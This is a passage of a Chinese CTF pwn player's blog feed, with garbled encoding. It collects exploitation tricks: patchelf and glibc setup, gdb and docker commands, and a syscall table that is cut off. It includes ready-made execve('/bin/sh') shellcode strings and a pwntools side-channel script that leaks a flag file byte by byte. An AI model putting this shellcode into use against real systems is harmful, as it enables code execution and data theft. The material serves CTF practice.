title="è‡´è°¢"></a>è‡´è°¢</h3><p>æ„Ÿè°¢è€çˆ¸è€å¦ˆå› ä¸ºæ‹…å¿ƒæˆ‘çš„å¤è¯•æƒ…å†µè·‘æ¥æ­¦æ±‰ä¸ºæˆ‘åˆ†æ‹…å‹åŠ›ï¼ˆ<del>è™½ç„¶ä¸¤å¤©åå› ä¸ºæ°´åœŸä¸æœå°±å›å»äº†ï¼‰</del>ï¼Œæ„Ÿè°¢è€å§æ»´æ”¯æŒã€‚</p><p>æ„Ÿè°¢åˆ˜è€å¸ˆã€å®éªŒå®¤é‡Œçš„å­¦é•¿å­¦å§è¿˜æœ‰ä¸€èµ·æ‰“æ¯”èµ›çš„å¸ˆå‚…ä»¬ï¼Œç‰¹åˆ«æ„Ÿè°¢ <strong>@j1ang</strong> &amp; <strong>@4XWi11</strong> &amp; <strong>@scr1pt</strong>ï¼Œå¸¦ç€æˆ‘è¿™ä¸ªèœé¸¡æ··äº†å¥½å¤šå¥–ğŸ˜­ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052134673.png" alt="image-20230405213418516" style="zoom:40%;" /><p>æ„Ÿè°¢ <strong>@verf1sh</strong> å¸ˆå‚…å’Œ <strong>@tty</strong> å¸ˆå‚…ï¼Œåœ¨æˆ‘å­¦ä¹ äºŒè¿›åˆ¶çš„è¿‡ç¨‹ä¸­ç»™äº†æˆ‘å¾ˆå¤šå¯å‘ã€‚</p><p>æ„Ÿè°¢ HZNUï¼Œæ„Ÿè°¢æˆ‘çš„é¥­å‹ä»¬ï¼Œå†æ¬¡æ„Ÿè°¢æ‰€æœ‰å…³å¿ƒã€é¼“åŠ±ã€æ”¯æŒæˆ‘çš„å®¶äººå’Œæœ‹å‹ä»¬ã€‚</p><p>æœ€åæ„Ÿè°¢åŠªåŠ›äº†ä¸€å¹´çš„è‡ªå·±ğŸ™‚ã€‚</p><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304052158276.jpg" alt="img" style="zoom: 50%;" />]]></content>
    
    
    <summary type="html">&lt;img src=&quot;https://anza.oss-cn-hangzhou.aliyuncs.com/img/202304042018896.png&quot; alt=&quot;image-20230404201805060&quot; style=&quot;zoom: 25%;&quot; /&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>æŠ€å·§æ€»ç»“</title>
    <link href="http://example.com/2023/02/01/tricks/"/>
    <id>http://example.com/2023/02/01/tricks/</id>
    <published>2023-02-01T14:26:10.000Z</published>
    <updated>2023-09-17T03:52:24.035Z</updated>
    
    <content type="html"><![CDATA[<p>æ€»ç»“ä¸€äº›å¸¸ç”¨çš„æŠ€å·§ã€‚</p><span id="more"></span><h2 id="patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld"><a href="#patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld" class="headerlink" title="patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld"></a>patchelfâ€”â€”æ›¿æ¢æ–‡ä»¶çš„libcå’Œld</h2><p>å¦‚æœå‡ºé¢˜æ–¹æ²¡æœ‰æä¾›<code>libc</code>å’Œ<code>ld</code>ï¼Œè¯·çœ‹æŠ€å·§<code>glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug</code>ï¼š</p><p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185193/37/30162/4434/63c7ad55F0660ee0e/1543736411453741.png"></p><p>æ›´æ¢å‰ï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/177648/14/31676/38386/63c7ad56Ff8f96af0/34a9c8de00276d1e.png" style="zoom:80%;" /><p>è£…è½½å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ–°ldå’Œlibcå‡ä½¿ç”¨ç»å¯¹è·¯å¾„</span></span><br><span class="line"><span class="comment"># æ›´æ¢ld</span></span><br><span class="line"><span class="comment"># patchelf --set-interpreter /path/to/ld.so /path/to/binary</span></span><br><span class="line">patchelf --set-interpreter /home/anza/hgame/spfa/ld-2.31.so ./spfa</span><br><span class="line"><span class="comment"># æ›´æ¢libc</span></span><br><span class="line"><span class="comment"># patchelf --replace-needed originlibc newlibc /path/to/binary</span></span><br><span class="line">patchelf --replace-needed libc.so.6 /home/anza/hgame/spfa/libc-2.31.so ./spfa</span><br></pre></td></tr></table></figure><p>æ›´æ¢åï¼š</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/4230/21/20981/40404/63c7ad56F2f43d7dd/a51d37282b0c94d1.png" style="zoom:80%;" /><h2 id="glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc-ld-debug"><a href="#glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc-ld-debug" class="headerlink" title="glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug"></a>glibc-all-in-oneâ€”â€”æŸ¥æ‰¾libc/ld/.debug</h2><p><code>patchelf</code>ä¿®æ”¹äº†<code>libc</code>å’Œ<code>ld</code>ï¼Œè€Œ<code>gdb</code>è°ƒè¯•æ—¶ä¼šå»å¯»æ‰¾<code>libc</code>ç›®å½•ä¸‹çš„<code>.debug</code>æ–‡ä»¶ï¼Œæ‰€ä»¥æ— æ³•ä½¿ç”¨ä¸€äº›<code>heap/bins</code>ä¹‹ç±»çš„å‘½ä»¤ï¼Œå› æ­¤æˆ‘ä»¬å»<code>glibc-all-in-one</code>ä¸­ä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„<code>libc</code>åŠå…¶é™„å¸¦çš„<code>.debug</code>ã€‚</p><p>å®ç°æ“ä½œå¦‚ä¸‹ï¼š</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd /glibc-all-in-one/</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo python3 update_list</span><br><span class="line">[+] <span class="keyword">Common</span> <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;list&quot;</span></span><br><span class="line">[+] Old-release <span class="keyword">list</span> has been <span class="keyword">save</span> <span class="keyword">to</span> <span class="string">&quot;old_list&quot;</span></span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cat <span class="keyword">list</span></span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu11.<span class="number">3</span>_i386</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.23</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">5</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1.<span class="number">6</span>_i386</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.27</span>-<span class="number">3</span>ubuntu1_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">9</span>_i386</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_amd64</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3.<span class="number">1</span>_i386</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_amd64</span><br><span class="line"><span class="number">2.35</span>-<span class="number">0</span>ubuntu3_i386</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_amd64</span><br><span class="line"><span class="number">2.36</span>-<span class="number">0</span>ubuntu1_i386</span><br><span class="line"></span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ sudo ./download <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one$ cd libs/</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ ls</span><br><span class="line"><span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br><span class="line">fuzz@fuzz-virtual-machine:/glibc-all-in-one/libs$ cd <span class="number">2.31</span>-<span class="number">0</span>ubuntu9.<span class="number">7</span>_amd64</span><br></pre></td></tr></table></figure><p>åœ¨è¯¥ç›®å½•ä¸‹<code>ctrl+h</code>ä¾¿èƒ½æ˜¾ç¤ºå‡ºéšè—æ–‡ä»¶<code>.debug</code>ï¼Œå°†<code>.debug</code>å¤åˆ¶åˆ°é¢˜ç›®çš„ç›®å½•ä¸‹ï¼Œ<code>gdb</code>è°ƒè¯•å‘½ä»¤å°±æ¢å¤äº†ã€‚</p><h2 id="gdbå¸¦åŸºå€è°ƒè¯•"><a href="#gdbå¸¦åŸºå€è°ƒè¯•" class="headerlink" title="gdbå¸¦åŸºå€è°ƒè¯•"></a>gdbå¸¦åŸºå€è°ƒè¯•</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *$rebase(0xç›¸å¯¹åŸºå€åç§»)</span><br></pre></td></tr></table></figure><h2 id="å…³é—­Alarm"><a href="#å…³é—­Alarm" class="headerlink" title="å…³é—­Alarm"></a>å…³é—­Alarm</h2><p>å‘½ä»¤è¡Œå…³é—­æ³•ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g ./vuln</span><br></pre></td></tr></table></figure><h2 id="dockerè°ƒè¯•å‘½ä»¤"><a href="#dockerè°ƒè¯•å‘½ä»¤" class="headerlink" title="dockerè°ƒè¯•å‘½ä»¤"></a>dockerè°ƒè¯•å‘½ä»¤</h2><p>åŸºæœ¬å‘½ä»¤ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br><span class="line">docker start å®¹å™¨id</span><br><span class="line">docker exec -it å®¹å™¨id /bin/bash</span><br><span class="line">docker cp æœ¬åœ°è·¯å¾„ å®¹å™¨id:å®¹å™¨è·¯å¾„</span><br></pre></td></tr></table></figure><p>docker æ‰“å¼€ tmuxï¼Œä»¥åŠæ‰“å¼€é¼ æ ‡æ»šåŠ¨:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tmux new</span><br></pre></td></tr></table></figure><p>docker åœ¨ tmux ä¸‹è°ƒè¯•è„šæœ¬éœ€æ·»åŠ ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;sp&#x27;, &#x27;-h&#x27;]</span><br></pre></td></tr></table></figure><h2 id="ä¸€äº›shellcode"><a href="#ä¸€äº›shellcode" class="headerlink" title="ä¸€äº›shellcode"></a>ä¸€äº›shellcode</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 32ä½ çŸ­å­—èŠ‚shellcode --&gt; 21å­—èŠ‚</span><br><span class="line">\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</span><br><span class="line"></span><br><span class="line"># 32ä½ çº¯asciiå­—ç¬¦shellcode</span><br><span class="line">PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJISZTK1HMIQBSVCX6MU3K9M7CXVOSC3XS0BHVOBBE9RNLIJC62ZH5X5PS0C0FOE22I2NFOSCRHEP0WQCK9KQ8MK0AA</span><br><span class="line"></span><br><span class="line"># 32ä½ scanfå¯è¯»å–çš„shellcode</span><br><span class="line">\xeb\x1b\x5e\x89\xf3\x89\xf7\x83\xc7\x07\x29\xc0\xaa\x89\xf9\x89\xf0\xab\x89\xfa\x29\xc0\xab\xb0\x08\x04\x03\xcd\x80\xe8\xe0\xff\xff\xff/bin/sh</span><br><span class="line"></span><br><span class="line"># 64ä½ scanfå¯è¯»å–çš„shellcode 22å­—èŠ‚</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><br><span class="line"></span><br><span class="line"># 64ä½ è¾ƒçŸ­çš„shellcode  23å­—èŠ‚</span><br><span class="line">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</span><br><span class="line"></span><br><span class="line"># 64ä½ çº¯asciiå­—ç¬¦shellcode</span><br><span class="line">Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t</span><br></pre></td></tr></table></figure><p>å¯èƒ½ç”¨åˆ°çš„çˆ†ç ´è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># # è¿™é‡Œçš„pwnåªæ˜¯ä¸ºäº†æ¼”ç¤ºæµç¨‹ï¼Œå…·ä½“é€»è¾‘è¿˜å¾—çœ‹é¢˜ç›®</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>(<span class="params">p, index, ch</span>):</span><br><span class="line">code = <span class="string">&quot;push 0x67616c66; mov rdi, rsp; mov rsi, 0x0; mov rax, 0x2; syscall;&quot;</span>  <span class="comment"># open</span></span><br><span class="line">code += <span class="string">&quot;mov rdi, 0x3; mov rsi, rsp; mov rdx, 0x30; mov rax, 0x0; syscall;&quot;</span>   <span class="comment"># read</span></span><br><span class="line">code += <span class="string">&quot;cmp byte ptr[rsi+&#123;&#125;], &#123;&#125;; jz loop;&quot;</span>.<span class="built_in">format</span>(index, ch)                <span class="comment"># cmp</span></span><br><span class="line">code += <span class="string">&quot;xor edi, edi; mov rax, 60; syscall; loop: jmp loop;&quot;</span>                 <span class="comment"># ç­‰åˆ™è¿›å…¥æ­»å¾ªç¯ï¼Œå¦åˆ™exit(0)</span></span><br><span class="line">code = <span class="string">b&quot;\x90&quot;</span>*<span class="number">20</span>+asm(code)  <span class="comment"># å‰é¢åŠ äº†\x90æ»‘æ¿</span></span><br><span class="line"></span><br><span class="line">p.send(code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag_str = string.printable</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>):</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = process(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                ch = flag_str[index]</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; test ch &#123;&#125;&quot;</span>.<span class="built_in">format</span>(ch))</span><br><span class="line">                pwn(p, offset, <span class="built_in">ord</span>(flag_str[index]))</span><br><span class="line">                p.recv(timeout=<span class="number">1</span>)</span><br><span class="line">                flag += ch</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; find flag: &quot;</span>, flag)</span><br><span class="line">                p.close()</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="comment"># æ•è·p.recväº§ç”Ÿçš„é”™è¯¯</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                <span class="built_in">print</span>(e)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    p.close()</span><br><span class="line">                    index += <span class="number">1</span></span><br><span class="line">                <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                    <span class="comment"># æ•è·p.closeäº§ç”Ÿçš„é”™è¯¯</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                    <span class="built_in">print</span>(e)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span>*<span class="number">10</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">        <span class="comment"># åˆ¤æ–­flagæ˜¯å¦å·²ç»ç»“æŸ</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="linux-ä¸‹æŸ¥æ‰¾"><a href="#linux-ä¸‹æŸ¥æ‰¾" class="headerlink" title="linux ä¸‹æŸ¥æ‰¾"></a>linux ä¸‹æŸ¥æ‰¾</h2><p>â€‹    æŸ¥æ‰¾å†…å®¹åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -rn &quot;__dls3&quot; ./</span><br></pre></td></tr></table></figure><p>â€‹    æŸ¥æ‰¾æ–‡ä»¶åä¸­åŒ…å«ç‰¹å®šå­—ç¬¦ä¸²çš„æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find ./ -name &#x27;*2021-11-01*&#x27;</span><br></pre></td></tr></table></figure><h2 id="å¸¸è§-signal"><a href="#å¸¸è§-signal" class="headerlink" title="å¸¸è§ signal"></a>å¸¸è§ signal</h2><img src="https://anza.oss-cn-hangzhou.aliyuncs.com/img/202309072013720.png" alt="image-20230907201341848" style="zoom:50%;" /><h2 id="64-ä½ç³»ç»Ÿè°ƒç”¨"><a href="#64-ä½ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="64 ä½ç³»ç»Ÿè°ƒç”¨"></a>64 ä½ç³»ç»Ÿè°ƒç”¨</h2><table><thead><tr><th>ç³»ç»Ÿè°ƒç”¨å·</th><th>å‡½æ•°å</th><th>å…¥å£ç‚¹</th></tr></thead><tbody><tr><td>0</td><td>read</td><td>sys_read</td></tr><tr><td>1</td><td>write</td><td>sys_write</td></tr><tr><td>2</td><td>open</td><td>sys_open</td></tr><tr><td>3</td><td>close</td><td>sys_close</td></tr><tr><td>4</td><td>stat</td><td>sys_newstat</td></tr><tr><td>5</td><td>fstat</td><td>sys_newfstat</td></tr><tr><td>6</td><td>lstat</td><td>sys_newlstat</td></tr><tr><td>7</td><td>poll</td><td>sys_poll</td></tr><tr><td>8</td><td>lseek</td><td>sys_lseek</td></tr><tr><td>9</td><td>mmap</td><td>sys_mmap</td></tr><tr><td>10</td><td>mprotect</td><td>sys_mprotect</td></tr><tr><td>11</td><td>munmap</td><td>sys_munmap</td></tr><tr><td>12</td><td>brk</td><td>sys_brk</td></tr><tr><td>13</td><td>rt_sigaction</td><td>sys_rt_sigaction</td></tr><tr><td>14</td><td>rt_sigprocmask</td><td>sys_rt_sigprocmask</td></tr><tr><td>15</td><td>rt_sigreturn</td><td>stub_rt_sigreturn</td></tr><tr><td>16</td><td>ioctl</td><td>sys_ioctl</td></tr><tr><td>17</td><td>pread64</td><td>sys_pread64</td></tr><tr><td>18</td><td>pwrite64</td><td>sys_pwrite64</td></tr><tr><td>19</td><td>readv</td><td>sys_readv</td></tr><tr><td>20</td><td>writev</td><td>sys_writev</td></tr><tr><td>21</td><td>access</td><td>sys_access</td></tr><tr><td>22</td><td>pipe</td><td>sys_pipe</td></tr><tr><td>23</td><td>select</td><td>sys_select</td></tr><tr><td>24</td><td>sched_yield</td><td>sys_sched_yield</td></tr><tr><td>25</td><td>mremap</td><td>sys_mremap</td></tr><tr><td>26</td><td>msync</td><td>sys_msync</td></tr><tr><td>27</td><td>mincore</td><td>sys_mincore</td></tr><tr><td>28</td><td>madvise</td><td>sys_madvise</td></tr><tr><td>29</td><td>shmget</td><td>sys_shmget</td></tr><tr><td>30</td><td>shmat</td><td>sys_shmat</td></tr><tr><td>31</td><td>shmctl</td><td>sys_shmctl</td></tr><tr><td>32</td><td>dup</td><td>sys_dup</td></tr><tr><td>33</td><td>dup2</td><td>sys_dup2</td></tr><tr><td>34</td><td>pause</td><td>sys_pause</td></tr><tr><td>35</td><td>nanosleep</td><td>sys_nanosleep</td></tr><tr><td>36</td><td>getitimer</td><td>sys_getitimer</td></tr><tr><td>37</td><td>alarm</td><td>sys_alarm</td></tr><tr><td>38</td><td>setitimer</td><td>sys_setitimer</td></tr><tr><td>39</td><td>getpid</td><td>sys_getpid</td></tr><tr><td>40</td><td>sendfile</td><td>sys_sendfile64</td></tr><tr><td>41</td><td>socket</td><td>sys_socket</td></tr><tr><td>42</td><td>connect</td><td>sys_connect</td></tr><tr><td>43</td><td>accept</td><td>sys_accept</td></tr><tr><td>44</td><td>sendto</td><td>sys_sendto</td></tr><tr><td>45</td><td>recvfrom</td><td>sys_recvfrom</td></tr><tr><td>46</td><td>sendmsg</td><td>sys_sendmsg</td></tr><tr><td>47</td><td>recvmsg</td><td>sys_recvmsg</td></tr><tr><td>48</td><td>shutdown</td><td>sys_shutdown</td></tr><tr><td>49</td><td>bind</td><td>sys_bind</td></tr><tr><td>50</td><td>listen</td><td>sys_listen</td></tr><tr><td>51</td><td>getsockname</td><td>sys_getsockname</td></tr><tr><td>52</td><td>getpeername</td><td>sys_getpeername</td></tr><tr><td>53</td><td>socketpair</td><td>sys_socketpair</td></tr><tr><td>54</td><td>setsockopt</td><td>sys_setsockopt</td></tr><tr><td>55</td><td>getsockopt</td><td>sys_getsockopt</td></tr><tr><td>56</td><td>clone</td><td>stub_clone</td></tr><tr><td>57</td><td>fork</td><td>stub_fork</td></tr><tr><td>58</td><td>vfork</td><td>stub_vfork</td></tr><tr><td>59</td><td>execve</td><td>stub_execve</td></tr><tr><td>60</td><td>exit</td><td>sys_exit</td></tr><tr><td>61</td><td>wait4</td><td>sys_wait4</td></tr><tr><td>62</td><td>kill</td><td>sys_kill</td></tr><tr><td>63</td><td>uname</td><td>sys_newuname</td></tr><tr><td>64</td><td>semget</td><td>sys_semget</td></tr><tr><td>65</td><td>semop</td><td>sys_semop</td></tr><tr><td>66</td><td>semctl</td><td>sys_semctl</td></tr><tr><td>67</td><td>shmdt</td><td>sys_shmdt</td></tr><tr><td>68</td><td>msgget</td><td>sys_msgget</td></tr><tr><td>69</td><td>msgsnd</td><td>sys_msgsnd</td></tr><tr><td>70</td><td>msgrcv</td><td>sys_msgrcv</td></tr><tr><td>71</td><td>msgctl</td><td>sys_msgctl</td></tr><tr><td>72</td><td>fcntl</td><td>sys_fcntl</td></tr><tr><td>73</td><td>flock</td><td>sys_flock</td></tr><tr><td>74</td><td>fsync</td><td>sys_fsync</td></tr><tr><td>75</td><td>fdatasync</td><td>sys_fdatasync</td></tr><tr><td>76</td><td>truncate</td><td>sys_truncate</td></tr><tr><td>77</td><td>ftruncate</td><td>sys_ftruncate</td></tr><tr><td>78</td><td>getdents</td><td>sys_getdents</td></tr><tr><td>79</td><td>getcwd</td><td>sys_getcwd</td></tr><tr><td>80</td><td>chdir</td><td>sys_chdir</td></tr><tr><td>81</td><td>fchdir</td><td>sys_fchdir</td></tr><tr><td>82</td><td>rename</td><td>sys_rename</td></tr><tr><td>83</td><td>mkdir</td><td>sys_mkdir</td></tr><tr><td>84</td><td>rmdir</td><td>sys_rmdir</td></tr><tr><td>85</td><td>creat</td><td>sys_creat</td></tr><tr><td>86</td><td>link</td><td>sys_link</td></tr><tr><td>87</td><td>unlink</td><td>sys_unlink</td></tr><tr><td>88</td><td>symlink</td><td>sys_symlink</td></tr><tr><td>89</td><td>readlink</td><td>sys_readlink</td></tr><tr><td>90</td><td>chmod</td><td>sys_chmod</td></tr><tr><td>91</td><td>fchmod</td><td>sys_fchmod</td></tr><tr><td>92</td><td>chown</td><td>sys_chown</td></tr><tr><td>93</td><td>fchown</td><td>sys_fchown</td></tr><tr><td>94</td><td>lchown</td><td>sys_lchown</td></tr><tr><td>95</td><td>umask</td><td>sys_umask</td></tr><tr><td>96</td><td>gettimeofday</td><td>sys_gettimeofday</td></tr><tr><td>97</td><td>getrlimit</td><td>sys_getrlimit</td></tr><tr><td>98</td><td>getrusage</td><td>sys_getrusage</td></tr><tr><td>99</td><td>sysinfo</td><td>sys_sysinfo</td></tr><tr><td>100</td><td>times</td><td>sys_times</td></tr><tr><td>101</td><td>ptrace</td><td>sys_ptrace</td></tr><tr><td>102</td><td>getuid</td><td>sys_getuid</td></tr><tr><td>103</td><td>syslog</td><td>sys_syslog</td></tr><tr><td>104</td><td>getgid</td><td>sys_getgid</td></tr><tr><td>105</td><td>setuid</td><td>sys_setuid</td></tr><tr><td>106</td><td>setgid</td><td>sys_setgid</td></tr><tr><td>107</td><td>geteuid</td><td>sys_geteuid</td></tr><tr><td>108</td><td>getegid</td><td>sys_getegid</td></tr><tr><td>109</td><td>setpgid</td><td>sys_setpgid</td></tr><tr><td>110</td><td>getppid</td><td>sys_getppid</td></tr><tr><td>111</td><td>getpgrp</td><td>sys_getpgrp</td></tr><tr><td>112</td><td>setsid</td><td>sys_setsid</td></tr><tr><td>113</td><td>setreuid</td><td>sys_setreuid</td></t